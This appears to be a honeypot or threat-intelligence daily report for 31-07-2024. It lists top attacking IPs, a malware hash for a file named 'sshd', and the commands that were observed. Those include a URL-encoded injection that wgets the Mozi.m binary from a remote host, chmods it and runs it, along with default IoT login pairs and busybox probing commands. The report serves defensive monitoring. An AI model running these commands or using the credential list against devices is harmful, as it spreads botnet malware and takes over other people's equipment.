@@ -1,0 +1,37 @@
+Top 5 IPs for 31-07-2024 :
+
+209.38.26.116
+73.196.242.104
+140.246.92.156
+147.81.54.250
+27.215.90.214
+
+Malware Observed:
+
+File name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+
+
+Commands/exploits observed:
+
+27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$
+
+
+admin
+...meinsm
+support
+...support
+root
+...klv1234
+admin
+...1988
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox SFWDN
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SFWDN
+tftp; wget; /bin/busybox SFWDN
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
